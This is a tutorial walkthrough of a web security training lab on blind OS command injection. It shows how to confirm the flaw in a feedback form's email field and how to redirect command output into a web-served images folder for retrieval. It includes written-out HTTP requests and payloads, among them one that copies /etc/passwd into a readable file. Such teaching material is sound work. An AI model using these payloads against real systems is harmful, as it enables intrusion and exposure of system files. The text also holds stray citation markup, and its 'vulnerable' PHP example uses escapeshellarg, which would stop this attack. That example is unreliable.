# Command Injection - Lab #3: Blind OS Command Injection with Output Redirection

**YouTube Tutorial:** [Command Injection - Lab #3 Blind OS command injection with output redirection](https://youtu.be/4Wl9Ap8cmqQ?si=egGwQWVUdh0hAv1h)

---

## 1. What is Blind OS Command Injection with Output Redirection?

### Core Concept

Like Lab #2, this is a **blind command injection** — the vulnerable feedback function executes a shell command containing user-supplied input, and the command's output is **never returned in the HTTP response**. Unlike Lab #2 (where the only signal was a time delay), this lab has a **writable, web-accessible folder**. That means instead of just proving execution via timing, the attacker can **redirect the command's output to a file inside that folder**, then simply request the file over HTTP to read the result.

```
            INJECTION (write step)                     RETRIEVAL (read step)
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  email = ||whoami>          │          │  GET /image?filename=      │
   │  /var/www/images/output.txt │          │  output.txt                │
   │  ||                         │          │                            │
   └─────────────┬──────────────┘          └─────────────┬──────────────┘
                 ▼                                       ▼
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  Shell executes:            │          │  Web server serves the     │
   │  whoami > /var/www/images/  │          │  file straight from the    │
   │  output.txt                 │          │  images directory          │
   └─────────────┬──────────────┘          └─────────────┬──────────────┘
                 ▼                                       ▼
   ┌────────────────────────────┐          ┌────────────────────────────┐
   │  Response: unchanged        │          │  Response body = command   │
   │  (still blind, no output    │          │  output (e.g. "peter")     │
   │  in the feedback response)  │          │  = command output leaked ✅│
   └────────────────────────────┘          └────────────────────────────┘
```

The **file system itself becomes the oracle** — since the images folder is served directly by the web app, redirecting output there turns a blind injection into a fully readable one.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Feature:** The **feedback form** (Submit feedback) — same fields as Lab #2: `name`, `email`, `subject`, `message`.
* **Vulnerable Parameter:** `email`, confirmed by the <cite index="9-1">official lab solution</cite>.
* **Blind Command Injection Mechanism:** The application executes a shell command containing the user-supplied details, and <cite index="9-1">the output from the command is not returned in the response</cite>.
* **Detection/Exfiltration Channel:** <cite index="9-1">Output redirection into a writable folder, then retrieval via the app's own image-loading URL.</cite>
* **Writable folder:** <cite index="9-1">/var/www/images/</cite> — <cite index="9-1">the application serves the images for the product catalog from this location.</cite>
* **End Goal:** <cite index="9-1">Execute the whoami command and retrieve its output.</cite>

### Root Cause & Impact

* **Root Cause:** Same as Lab #2 — user-controlled form input is concatenated into an OS shell command with no sanitization or allow-listing.
* **Impact:** This lab demonstrates that "blind" doesn't mean "unreadable" — if *any* writable, web-servable directory exists, an attacker can turn output redirection into a full read primitive, recovering arbitrary command output (usernames, file contents, environment variables, etc.), not just a yes/no signal.

---

## 3. Attack Methods & Techniques (4-Phase Analysis)

This lab breaks down into four distinct phases — confirm the vulnerability exists, find where you can land a file, write the file, then verify it landed:

* **Phase 1 — Confirm Blind Command Injection:** Before trying to read anything, first prove the `email` parameter actually executes shell commands at all. Use a cheap, reversible test (a Lab #2-style time-delay payload) so you're not chasing a false lead.
* **Phase 2 — Check Where Images Are Stored:** Identify the folder the app writes/serves product images from, and confirm the app can write to it and that it's reachable over HTTP.
* **Phase 3 — Redirect Output to File:** Inject a payload that runs `whoami` and redirects its output into that folder as a new file.
* **Phase 4 — Check if File Was Created:** Request the new file through the app's own image-loading endpoint and confirm the command's output comes back.

### Server Behavior

* **Feedback submission response:** Identical whether or not injection succeeded — still blind, no output returned here.
* **Successful injection:** A new file (e.g. `output.txt`) appears in the images folder, containing the executed command's stdout.
* **Image request with swapped filename:** Returns the **contents of the file** instead of an image — this is where the leak becomes visible, confirming the file was created.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Feedback Submission Request

1. In the lab, click **"Submit feedback"** and fill the form with dummy values:

```
Name:      test
Email:     test@example.com
Subject:   test
Message:   test
```

2. Submit the form with **Burp Proxy interception ON**.
3. Send the captured `POST /feedback/submit` request to **Repeater**.

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=test%40example.com&subject=test&message=test
```

### Step 2 — Phase 1: Confirm Blind Command Injection

Before attempting output redirection, verify the injection point works at all.

1. Replace `email` with a harmless time-delay payload (same technique as Lab #2):

```http
email=x||ping+-c+10+127.0.0.1||
```

2. Send the request and time the response.
3. **Result:** If the response takes ~10 seconds instead of returning instantly, the `email` parameter is confirmed injectable. This is your green light to move on — no point building an output-redirection payload against a parameter that isn't actually vulnerable.
4. Revert the payload back to a normal value before moving to the next phase, so you don't leave stray delayed requests in the way.

### Step 3 — Phase 2: Check Where Images Are Stored

1. Browse the shop and open any product page — note that it has a product image.
2. With Burp Proxy intercepting (or by checking **HTTP history**), capture the request that loads that image:

```http
GET /image?filename=57.jpg HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION-COOKIE]
```

3. This confirms two things:
   * The app serves images through a predictable endpoint (`/image?filename=`) rather than static file paths.
   * <cite index="9-1">There is a writable folder at /var/www/images/</cite> that <cite index="9-1">the application serves the images for the product catalog from.</cite>
4. Send this image request to **Repeater** as well — you'll reuse it in Step 5 to check for the created file.

### Step 4 — Phase 3: Redirect Output to File

Now that the injection point is confirmed and the target folder is known, inject the payload that writes `whoami`'s output into that folder.

<cite index="9-1">Modify the email parameter, changing it to: email=||whoami>/var/www/images/output.txt||</cite>

```http
POST /feedback/submit HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

csrf=[CSRF-TOKEN]&name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
```

* **Injected payload:** `||whoami>/var/www/images/output.txt||`
* **Why it works:** `||` runs the right-hand command because the left-hand (empty/bogus) command fails. The right-hand side runs `whoami` and redirects its stdout into a new file inside the writable, web-accessible images directory, instead of letting it go to the discarded stdout stream.
* Send this request. The feedback response itself still looks completely ordinary — this step is still blind on this channel; you won't see confirmation here.

### Step 5 — Phase 4: Check if the File Was Created

1. Go back to the image request captured in Step 3.
2. Swap the `filename` parameter for the file you just wrote:

```http
GET /image?filename=output.txt HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: session=[SESSION-COOKIE]
```

3. Send the request in Repeater.
4. **Result:** If the response body now contains plain text (e.g. `peter`) instead of a 404 or image data, the file was created and the command output is confirmed.
5. The lab banner updates to **"Congratulations, you solved the lab!"**.

### Alternative Payloads (Also Work)

```http
email=x;whoami>/var/www/images/out.txt;                 # semicolon variant
email=x`whoami>/var/www/images/out.txt`                  # command substitution
email=x||whoami>/var/www/images/out.txt#                 # comment out trailing args
email=x||id>/var/www/images/out.txt||                    # capture more than just username
email=x||cat /etc/passwd>/var/www/images/passwd.txt||    # broader read (practice only)
```

---

## 5. Pro-Tips & Common Pitfalls

* **Confirm the writable, servable directory first:** This technique only works because `/var/www/images/` is both writable by the app process and directly reachable via the app's own file-serving endpoint. Not every blind injection has this luxury — see Lab #4 (out-of-band interaction) for when it doesn't.
* **Pick a filename you can guess later:** Use something predictable and unlikely to collide with existing product images (e.g. `output.txt`, not `57.jpg`), so retrieval in Step 4 is unambiguous.
* **Reuse the image-loading endpoint, don't guess the path:** Rather than trying to browse to `/var/www/images/output.txt` directly (which may not map to a public URL), reuse the application's own image parameter (e.g. `/image?filename=`) — it already resolves into that directory.
* **`||` vs `;` vs `` ` ` ``:** Same logic as Lab #2 — `||` is reliable here because the left-hand command is bogus and always fails, so the right-hand redirection command always runs.
* **Still blind on the feedback response:** Don't expect to see `whoami`'s output in the `POST /feedback/submit` response — that channel stays blind. The output only appears once you separately fetch the file.
* **Test write success before assuming failure:** If the retrieval step returns a 404 or the original image, double check the payload actually executed (e.g. via a Lab #2-style time-delay payload first) before troubleshooting the file path.
* **The vulnerable backend pattern:**

```php
// ❌ VULNERABLE — blind command injection, output discarded on this response,
// but a writable + web-servable directory turns it into a read primitive
$cmd = "mail " . escapeshellarg($email) . " ...";
system($cmd);

// ✅ SAFE — avoid shell calls entirely; use a mail library with native APIs,
// and never let application-writable directories overlap with web-servable ones
```

* **Prevention summary:**
  * Never call OS commands from application code; use native APIs/libraries instead.
  * Separate writable storage from publicly servable directories — a directory should never be both.
  * If shell calls are unavoidable, use argument-array APIs (no shell) plus strict allow-list validation of every field.
  * Run the app as a low-privilege user and restrict filesystem write access to only what's strictly necessary.